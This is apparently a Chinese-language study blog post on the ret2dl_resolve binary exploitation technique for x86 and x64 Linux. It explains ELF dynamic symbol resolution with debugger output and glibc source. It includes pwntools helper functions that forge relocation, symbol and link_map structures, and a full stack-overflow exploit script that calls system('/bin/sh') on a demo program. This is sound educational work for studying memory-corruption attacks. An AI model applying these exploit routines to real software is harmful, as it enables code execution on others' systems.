---
title: ret2dl_resolve学习笔记
tags:
  - PWN
date: 2017/10/7
---

关于ret2dl_resolve这个技巧，很多前辈已经说的很详细了。

所以这里我只是简单的做个记录，不指望能讲的多好。

网络上前辈的教程：

> [http://rk700.github.io/2015/08/09/return-to-dl-resolve/](http://rk700.github.io/2015/08/09/return-to-dl-resolve/)
> [http://angelboy.logdown.com/posts/283218-return-to-dl-resolve](http://angelboy.logdown.com/posts/283218-return-to-dl-resolve)
> [http://pwn4.fun/2016/11/09/Return-to-dl-resolve/](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)
> [https://github.com/inaz2/roputils/blob/master/roputils.py](https://github.com/inaz2/roputils/blob/master/roputils.py)

参考了很多，才理解，我好菜啊。

## x86

```cpp
#gcc pwn.c -fno-stack-protector -m32 -o pwn
#include <unistd.h>
#include <string.h>

void fun(){
    char buffer[0x20];
    read(0,buffer,0x200);
}

int main(){
    fun();
    return 0;
}
```

假设有这样一个小程序。

执行read(0,buffer,0x200)的时候实际上发生了这些：

```
//将三个参数压栈
   0x8048414 <fun+9>     push   0x200
   0x8048419 <fun+14>    lea    eax, [ebp - 0x28]
   0x804841c <fun+17>    push   eax
   0x804841d <fun+18>    push   0
//call到read的plt上
   0x804841f <fun+20>    call   read@plt                      <0x80482e0>

//jmp到read的got表上的地址处，由于第一次调用（不知道lazy binding的自行了解），
//got值为read@plt+6，
   0x80482e0  <read@plt>                  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+12] <0x804a00c>
   
pwndbg> x/wx 0x804a00c
0x804a00c:  0x080482e6

//此时入栈的0是JMPREL段（对应 .rel.plt节）的read的Elf32_Rel的相对偏移,即rel_offset
   0x80482e6  <read@plt+6>                push   0
   0x80482eb  <read@plt+11>               jmp    0x80482d0

//readelf中JMPREL段的地址
Dynamic section at offset 0xf14 contains 24 entries:
  标记        类型                         名称/值
 0x00000017 (JMPREL)                     0x8048298

//JMPREL段相应偏移处read的Elf32_Rel结构体
pwndbg> x/2wx 0x8048298+0
0x8048298:  0x0804a00c  0x00000107

//所对应的结构体
typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Word;
typedef struct
{
  Elf32_Addr    r_offset;               /* Address */
  Elf32_Word    r_info;                 /* Relocation type and symbol index */
} Elf32_Rel;
#define ELF32_R_SYM(val) ((val) >> 8) #define ELF32_R_TYPE(val) ((val) & 0xff)


//所以r_offset为0x0804a00c，r_info为0x00000107
//r_info则保存的是其类型和符号序号。
//根据宏的定义，可知对于此条目，其类型为ELF32_R_TYPE(r_info)=7，对应于R_386_JUMP_SLOT；
//其symbol index则为RLF32_R_SYM(r_info)=1。

//以下为 RLF32_R_SYM的结构体
typedef struct
{
  Elf32_Word    st_name;   /* Symbol name (string tbl index) */
  Elf32_Addr    st_value;  /* Symbol value */
  Elf32_Word    st_size;   /* Symbol size */
  unsigned char st_info;   /* Symbol type and binding */
  unsigned char st_other;  /* Symbol visibility under glibc>=2.2 */
  Elf32_Section st_shndx;  /* Section index */
} Elf32_Sym;

//这个结构体存在SYMTAB段，对应.dynsym节中，RLF32_R_SYM为read的这个结构体在SYMTAB段的index

//readelf中SYMTAB段的地址
Dynamic section at offset 0xf14 contains 24 entries:
  标记        类型                         名称/值
0x00000006 (SYMTAB)                     0x80481cc
0x0000000b (SYMENT)                     16 (bytes)//单个结构体的大小

//内存中的结构体
pwndbg> x/4wx 0x80481cc+1*16
0x80481dc:  0x0000001a  0x00000000  0x00000000  0x00000012

//我们只需要关注st_name即可，此处st_name为0x0000001a ，即name在STRTAB段的偏移

//readelf中STRTAB段的地址
Dynamic section at offset 0xf14 contains 24 entries:
  标记        类型                         名称/值
 0x00000005 (STRTAB)                     0x804821c

//read的name
pwndbg> x/s 0x804821c+0x1a
0x8048236:  "read"


//=============================

//综上，通过之前的push 0x0，我们得到了各个在dl_resolve必须用到的结构体，系统也是这样获取的。
//回到刚才的这两句代码继续...

   0x80482e6  <read@plt+6>                push   0
   0x80482eb  <read@plt+11>               jmp    0x80482d0

//0x804a004即为GOT[0],0x804a008即为GOT[1]
//前者是link_map，后者是_dl_runtime_resolve的地址
pwndbg> x/2i 0x80482d0
   0x80482d0:   push   DWORD PTR ds:0x804a004
   0x80482d6:   jmp    DWORD PTR ds:0x804a008

//也就是最后程序调用了_dl_runtime_resolve(link_map, rel_offset);

//我们需要在某处构造好上述的结构体，就能将任意符号解析到任意地址了。
```

![](dl_resolve_3b300c74dae850b1abab0c0ba4507d4b.png)

![](dl_resolve_8c8c7d866ba50da8775bfa9b12518cba.png)


具体构造过程参考上述的几个博客，这里就不再赘述了。


不过这里有一个坑，就是version。由于我们一般把这个Elf32\_Rel写在bss，所以rel\_offset会很大，version处出现了错误，会导致程序终止。

[https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#82](https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#82)

```cpp
82     /* Look up the target symbol.  If the normal lookup rules are not
83        used don't look in the global scope.  */
84    if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
85      {
86        const struct r_found_version *version = NULL;
87  
88        if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
89          {
90            const ElfW(Half) *vernum =
91              (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
92            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
93            version = &l->l_versions[ndx];
94            if (version->hash == 0)
95              version = NULL;
96          }
97  
98        /* We need to keep the scope around so do some locking.  This is
99           not necessary for objects which cannot be unloaded or when
100          we are not using any threads (yet).  */
101       int flags = DL_LOOKUP_ADD_DEPENDENCY;
102       if (!RTLD_SINGLE_THREAD_P)
103         {
104           THREAD_GSCOPE_SET_FLAG ();
105           flags |= DL_LOOKUP_GSCOPE_LOCK;
106         }
107 
108 #ifdef RTLD_ENABLE_FOREIGN_CALL
109       RTLD_ENABLE_FOREIGN_CALL;
110 #endif
111 
112       result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
113                                     version, ELF_RTYPE_CLASS_PLT, flags, NULL);
```

要让version为NULL，一个比较稳的方法是构造ndx为0。

也就是这行：

```cpp
ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
```

为了练习，我使用pwntools的模块，仿造roputils写了一个ret2dl\_resolve的函数。

```python
def ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=1):
    jmprel = ELF_obj.dynamic_value_by_tag("DT_JMPREL")#rel_plt
    relent = ELF_obj.dynamic_value_by_tag("DT_RELENT")
    symtab = ELF_obj.dynamic_value_by_tag("DT_SYMTAB")#dynsym
    syment = ELF_obj.dynamic_value_by_tag("DT_SYMENT")
    strtab = ELF_obj.dynamic_value_by_tag("DT_STRTAB")#dynstr
    versym = ELF_obj.dynamic_value_by_tag("DT_VERSYM")#version
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr

    p_name = fake_stage+8-strtab
    len_bypass_version = 8-(len(func_name)+1)%0x8
    sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab

    if sym_addr_offset%0x10 != 0:
        if sym_addr_offset%0x10 == 8:
            len_bypass_version+=8
            sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab
        else:
            error('something error!')

    fake_sym = sym_addr_offset/0x10

    while True:
        fake_ndx = u16(ELF_obj.read(versym+fake_sym*2,2))
        if fake_ndx != 0:
            fake_sym+=1
            len_bypass_version+=0x10
            continue
        else:
            break


    if do_slim:
        slim = len_bypass_version - len_bypass_version%8
        version = len_bypass_version%8
        resolve_data,resolve_call=ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage+slim,0)
        return (resolve_data,resolve_call,fake_stage+slim)

    fake_r_info = fake_sym<<8|0x7
    reloc_offset=fake_stage-jmprel

    resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+'\x00'
    resolve_data += 'a'*len_bypass_version
    resolve_data += p32(p_name)+p32(0)+p32(0)+p32(0x12)

    resolve_call = p32(plt0)+p32(reloc_offset)

    return (resolve_data,resolve_call)
```

来简单的pwn一下上面那个小程序吧。


exp:

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

cn = process('./pwn5_2')
binary = ELF('./pwn5_2')

def z(a=''):
    gdb.attach(cn,a)
    if a=='':
        raw_input()

def ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=1):
    jmprel = ELF_obj.dynamic_value_by_tag("DT_JMPREL")#rel_plt
    relent = ELF_obj.dynamic_value_by_tag("DT_RELENT")
    symtab = ELF_obj.dynamic_value_by_tag("DT_SYMTAB")#dynsym
    syment = ELF_obj.dynamic_value_by_tag("DT_SYMENT")
    strtab = ELF_obj.dynamic_value_by_tag("DT_STRTAB")#dynstr
    versym = ELF_obj.dynamic_value_by_tag("DT_VERSYM")#version
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr

    p_name = fake_stage+8-strtab
    len_bypass_version = 8-(len(func_name)+1)%0x8
    sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab

    if sym_addr_offset%0x10 != 0:
        if sym_addr_offset%0x10 == 8:
            len_bypass_version+=8
            sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab
        else:
            error('something error!')

    fake_sym = sym_addr_offset/0x10

    while True:
        fake_ndx = u16(ELF_obj.read(versym+fake_sym*2,2))
        if fake_ndx != 0:
            fake_sym+=1
            len_bypass_version+=0x10
            continue
        else:
            break


    if do_slim:
        slim = len_bypass_version - len_bypass_version%8
        version = len_bypass_version%8
        resolve_data,resolve_call=ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage+slim,0)
        return (resolve_data,resolve_call,fake_stage+slim)

    fake_r_info = fake_sym<<8|0x7
    reloc_offset=fake_stage-jmprel

    resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+'\x00'
    resolve_data += 'a'*len_bypass_version
    resolve_data += p32(p_name)+p32(0)+p32(0)+p32(0x12)

    resolve_call = p32(plt0)+p32(reloc_offset)

    return (resolve_data,resolve_call)
        


p1ret = 0x080482c9
p3ret = 0x080484a9

stage = binary.bss()

dl_data,dl_call,stage = ret2dl_resolve_x86(binary,'system',binary.bss()+0x200,stage)



pay = 'a'*40 + 'bbbb'
pay += p32(binary.plt['read'])+p32(p3ret)+p32(0)+p32(stage)+p32(len(dl_data)+8)
pay += dl_call
pay += p32(p1ret)+p32(stage+len(dl_data))

cn.sendline(pay)
sleep(0.1)
#z('b _dl_runtime_resolve\nb _dl_fixup\nc')
cn.send(dl_data+'/bin/sh\x00')

cn.interactive()

```



## x64

大体上一致，也是构造结构体。但是结构体的大小以及有些元素的顺序发生了变化。

绕过version的方法不能再用用x86的方法了,这是因为在64位下,程序一般分配了0x400000-0x401000,0x600000-0x601000,0x601000-0x602000这三个段,而VERSYM在0x400000-0x401000,伪造的一些表我们一般是伪造在0x601000-0x602000这个rw段上,这样idx是落不到已经分配的段上的,因此构造失败.

方法变成了覆盖 (link\_map + 0x1c8) 处为 NULL, 也就是`if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)`这一句.
但是link\_map是在ld.so上的,因此我们需要leak,若程序没有输出函数,则无法使用这个方法.

参考上面几篇文章的方法,我也写了一个x64版的ret2dl_resolve函数来学习.

```python
def ret2dl_resolve_x64(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=1):
    # prerequisite:
    # 1) overwrite (link_map + 0x1c8) with NULL
    # 2) set registers for arguments
    jmprel = ELF_obj.dynamic_value_by_tag("DT_JMPREL")#rel_plt
    relaent = ELF_obj.dynamic_value_by_tag("DT_RELAENT")
    symtab = ELF_obj.dynamic_value_by_tag("DT_SYMTAB")#dynsym
    syment = ELF_obj.dynamic_value_by_tag("DT_SYMENT")
    strtab = ELF_obj.dynamic_value_by_tag("DT_STRTAB")#dynstr
    versym = ELF_obj.dynamic_value_by_tag("DT_VERSYM")#version
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr

    padding1 = relaent-(fake_stage-symtab)%relaent
    padding2 = (jmprel-symtab)%relaent

    reloc_offset=(fake_stage+padding1+relaent+padding2-jmprel)/relaent
    st_name = fake_stage+padding1+relaent+padding2+relaent-strtab
    fake_sym = (fake_stage+padding1-symtab)/relaent
    fake_r_info = fake_sym<<32|0x7

    resolve_data=""
    if not do_slim:
        resolve_data+='A'*padding1

    resolve_data += p32(st_name)+p32(0x12)+p64(0)+p64(0)
    resolve_data += 'b'*padding2
    resolve_data += p64(resolve_addr)+p64(fake_r_info)+p64(0)
    resolve_data += func_name+'\x00'

    resolve_call = p64(plt0)+p64(reloc_offset)

    if not do_slim:
        return (resolve_data,resolve_call)
    return (resolve_data,resolve_call,fake_stage+padding1)
```



这样,在64位上的ret2dlresolve就有了一个很大的局限点,就是需要leak,并overwrite,有这个能力的话,其实我们就有很多其他更好的target了.有没有不需要leak&overwrite的办法??

有

我们调用`_dl_runtime_resolve`的时候的时候传进去了两个参数,一个是linkmap,一个是我们伪造的`rel_offset`,绕过的方法就是伪造linkmap!!

reference: [http://ddaa.tw/hitcon_pwn_200_blinkroot.html](http://ddaa.tw/hitcon_pwn_200_blinkroot.html)

注: 由于x86下无需伪造linkmap就能无leak使用`ret2dl_resolve`,因此此处我们仅讨论64位下的情况

```
00000000 link_map        struc ; (sizeof=0x470, align=0x8, copyof_95, variable size)
00000000                                         ; XREF: rtld_global/r
00000000 l_addr          dq ?                    ; XREF: dl_main+17FD/r
00000000                                         ; _dl_start+48/w ...
00000008 l_name          dq ?                    ; XREF: dl_main+21B/w
00000008                                         ; dl_main+180B/r ... ; offset
00000010 l_ld            dq ?                    ; XREF: dl_main+1137/r
00000010                                         ; _dl_start+3E/w ; offset
00000018 l_next          dq ?                    ; XREF: dl_main+FD5/w
00000018                                         ; dl_main+1A48/r ... ; offset
00000020 l_prev          dq ?                    ; XREF: dl_main+1865/w
00000020                                         ; dl_main+1A4F/r ... ; offset
00000028 l_real          dq ?                    ; XREF: _dl_start+221/w ; offset
00000030 l_ns            dq ?
00000038 l_libname       dq ?                    ; XREF: dl_main:loc_211A/r
00000038                                         ; dl_main+8CF/r ... ; offset
00000040 l_info          dq 76 dup(?)            ; XREF: dl_main:loc_2128/r
00000040                                         ; dl_main+8C8/r ... ; offset
000002A0 l_phdr          dq ?                    ; XREF: dl_main+18BD/w ; offset
000002A8 l_entry         dq ?
000002B0 l_phnum         dw ?                    ; XREF: dl_main+18C8/w
000002B2 l_ldnum         dw ?
000002B4                 db ? ; undefined
000002B5                 db ? ; undefined
000002B6                 db ? ; undefined
000002B7                 db ? ; undefined
000002B8 l_searchlist    r_scope_elem ?
000002C8 l_symbolic_searchlist r_scope_elem ?
000002D8 l_loader        dq ?                    ; offset
000002E0 l_versions      dq ?                    ; offset
000002E8 l_nversions     dd ?
000002EC l_nbuckets      dd ?
000002F0 l_gnu_bitmask_idxbits dd ?
000002F4 l_gnu_shift     dd ?
000002F8 l_gnu_bitmask   dq ?                    ; offset
00000300 _anon_0         $BA86E67FF2820C66E7CADF8F281E050C ?
00000308 _anon_1         $5C94D562908A6C967CD4DD6D0F71A7A2 ?
00000310 l_direct_opencount dd ?
00000314 _bf314          db ?                    ; XREF: dl_main:loc_218B/r
00000314                                         ; dl_main:loc_30A0/r ...
00000315 _bf315          db ?
00000316 _bf316          db ?
00000317                 db ? ; undefined
00000318 l_rpath_dirs    r_search_path_struct ?
00000328 l_reloc_result  dq ?                    ; offset
00000330 l_versyms       dq ?                    ; offset
00000338 l_origin        dq ?                    ; offset
00000340 l_map_start     dq ?                    ; XREF: _dl_start+22F/w
00000340                                         ; _dl_check_caller+86/r
00000348 l_map_end       dq ?                    ; XREF: _dl_start+23D/w
00000350 l_text_end      dq ?                    ; XREF: _dl_start+24B/w
00000350                                         ; _dl_check_caller+91/r
00000358 l_scope_mem     dq 4 dup(?)             ; offset
00000378 l_scope_max     dq ?
00000380 l_scope         dq ?                    ; offset
00000388 l_local_scope   dq 2 dup(?)             ; offset
00000398 l_file_id       r_file_id ?             ; XREF: _dl_map_object_from_fd:loc_6308/r
00000398                                         ; _dl_map_object_from_fd+D6F/r
000003A8 l_runpath_dirs  r_search_path_struct ?
000003B8 l_initfini      dq ?                    ; offset
000003C0 l_reldeps       dq ?                    ; offset
000003C8 l_reldepsmax    dd ?
000003CC l_used          dd ?
000003D0 l_feature_1     dd ?
000003D4 l_flags_1       dd ?
000003D8 l_flags         dd ?
000003DC l_idx           dd ?
000003E0 l_mach          link_map_machine ?
000003F8 l_lookup_cache  $2455BD847B398C721BD5A7DEADBA279A ?
00000418 l_tls_initimage dq ?                    ; offset
00000420 l_tls_initimage_size dq ?
00000428 l_tls_blocksize dq ?                    ; XREF: dl_main:loc_3177/r
00000430 l_tls_align     dq ?
00000438 l_tls_firstbyte_offset dq ?
00000440 l_tls_offset    dq ?                    ; XREF: _dl_start+44C/r
00000440                                         ; _dl_start+474/r
00000448 l_tls_modid     dq ?                    ; XREF: dl_main+1916/w
00000450 l_tls_dtor_count dq ?
00000458 l_relro_addr    dq ?                    ; XREF: dl_main+18F5/w
00000458                                         ; _dl_map_object_from_fd:loc_6928/r
00000460 l_relro_size    dq ?                    ; XREF: dl_main+1900/w
00000460                                         ; _dl_map_object_from_fd+126D/r
00000468 l_serial        dq ?
00000470 l_audit         auditstate 0 dup(?)
00000470 link_map        ends
```

可以看到linkmap很大,基本没有办法完整的伪造一份.
而且linkmap中有一个叫`l_scope`的成员在`_dl_fixup`内部的`_dl_lookup_symbol_x`会用上,而`l_scope`指向ld内部,因此无法伪造.

```cpp
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
```
bypass的方法就是不进`_dl_lookup_symbol_x`,利用已解析的函数来调用任意函数,方法如下.

```cpp
DL_FIXUP_VALUE_TYPE
attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
       ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
       struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
    {
      const ElfW(Half) *vernum =
        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
      version = &l->l_versions[ndx];
      if (version->hash == 0)
        version = NULL;
    }

      /* We need to keep the scope around so do some locking.  This is
     not necessary for objects which cannot be unloaded or when
     we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
    {
      THREAD_GSCOPE_SET_FLAG ();
      flags |= DL_LOOKUP_GSCOPE_LOCK;
    }

#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif

      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
    THREAD_GSCOPE_RESET_FLAG ();

#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif

      /* Currently result contains the base load address (or link map)
     of the object that defines sym.  Now add in the symbol
     offset.  */
      value = DL_FIXUP_MAKE_VALUE (result,
                   sym ? (LOOKUP_VALUE_ADDRESS (result)
                      + sym->st_value) : 0);
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
     address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
      result = l;
    }

  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);

  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;

  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
}
```

9-21行程序从linkmap读取必要的信息,L25处的if表示这个函数是否已经解析过,若已经解析过则来到L71,执行
`value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);`

```
#define DL_FIXUP_MAKE_VALUE(map, addr) (addr)
/* Extract the code address from a value of type DL_FIXUP_MAKE_VALUE.
 */
```
`sym`是通过linkmap解析出来的,因此`sym->st_value`可以伪造成任意值,而`l->l_addr`是linkmap的第一个元素,8字节,如果linkmap刚好够着got表,让`l->l_addr`内为got表的一个函数,假设为`__libc_start_main`,如果我们想调用`system`,只需构造`sym->st_value`为`system`和`__libc_start_main`之间的相对偏移即可.当然,只要你能在固定位置找到一个glibc上的指针,能够计算相对偏移应该都是可以的.

同样,我也写了一个函数来快速实现exploit:

```python
def ret2dl_resolve_linkmap_x64(ELF_obj,known_offset_addr,two_offset,linkmap_addr):
    '''
    WARNING: assert *(known_offset_addr-8) & 0x0000ff0000000000 != 0 
    WARNING: fake_linkmap is 0x100 bytes length,be careful
    WARNING: two_offset = target - *(known_offset_addr)

    _dl_runtime_resolve(linkmap,reloc_arg)
    reloc_arg=0

    linkmap:
    0x00: START
    0x00: l_addr = two_offset
    0x08: fake_DT_JMPREL : 0
    0x10: fake_DT_JMPREL : p_fake_JMPREL
    0x18: fake_JMPREL = [p_r_offset,r_info,append],p_r_offset
    0x20: r_info
    0x28: append
    0x30: r_offset
    0x38: fake_DT_SYMTAB: 0
    0x40: fake_DT_SYMTAB: known_offset_addr-8
    0x48: /bin/sh(for system)
    0x68: P_DT_STRTAB = linkmap_addr(just a pointer)
    0x70: p_DT_SYMTAB = fake_DT_SYMTAB
    0xf8: p_DT_JMPREL = fake_DT_JMPREL
    0x100: END
    '''
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr

    linkmap=""
    linkmap+=p64(two_offset&(2**64-1))
    linkmap+=p64(0)+p64(linkmap_addr+0x18)
    linkmap+=p64((linkmap_addr+0x30-two_offset)&(2**64-1))+p64(0x7)+p64(0)
    linkmap+=p64(0)
    linkmap+=p64(0)+p64(known_offset_addr-8)
    linkmap+='/bin/sh\x00'#for system offset 0x48
    linkmap = linkmap.ljust(0x68,'A')
    linkmap+=p64(linkmap_addr)
    linkmap+=p64(linkmap_addr+0x38)
    linkmap = linkmap.ljust(0xf8,'A')
    linkmap+=p64(linkmap_addr+8)

    resolve_call = p64(plt0+6)+p64(linkmap_addr)+p64(0)
    return (linkmap,resolve_call)
```
